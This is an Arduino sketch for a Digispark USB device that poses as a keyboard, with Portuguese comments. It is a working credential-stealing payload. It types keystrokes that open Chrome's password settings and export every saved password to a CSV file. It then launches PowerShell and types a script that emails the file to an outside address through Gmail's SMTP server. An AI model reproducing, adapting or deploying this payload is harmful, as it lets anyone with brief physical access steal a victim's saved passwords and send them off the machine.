#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  // Abrindo o google
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("chrome");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // Indo até as senhas
  DigiKeyboard.print("chrome://settings/passwords");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t\t\t\t\t\t\t");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("senhas.csv");
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t\t\t");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Salvando as senhas
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //from email address:
  DigiKeyboard.print(F("$email = \"EMAIL\";"));
  //to email address
  DigiKeyboard.print(F("$addressee = \" SEU EMAIL\";"));
  // o lugar onde vai salvar as senhas
  DigiKeyboard.print(F("$tempcsv = \"D:\\Pessoal\\Documents\\senhas.csv\";"));
  // senha da sua conta
  DigiKeyboard.print(F("$pass = \"SENHA\";"));
  DigiKeyboard.print(F("$smtpServer = \"smtp.gmail.com\";"));
  DigiKeyboard.print(F("$port = \"587\";"));

  DigiKeyboard.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
  DigiKeyboard.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
  DigiKeyboard.print(F("$msg = new-object Net.Mail.MailMessage;"));
  DigiKeyboard.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
  DigiKeyboard.print(F("$smtp.EnableSsl = $true;"));
  DigiKeyboard.print(F("$msg.From = \"$email\";"));
  DigiKeyboard.print(F("$msg.To.Add(\"$addressee\");"));
  DigiKeyboard.print(F("$msg.Attachments.Add(\"$tempcsv\");"));
  DigiKeyboard.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboard.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboard.print(F("$msg.IsBodyHTML = $true ;"));
  DigiKeyboard.print(F("$msg.Subject = \"Senhas do Navegador\";"));
  DigiKeyboard.print(F("$msg.Body = \"<h2> Aqui as suas senhas </h2></br>olha o arquivo...\"; "));
  DigiKeyboard.print(F("$SMTP.Credentials = $cred;"));
  DigiKeyboard.print(F("$smtp.Send($msg);"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
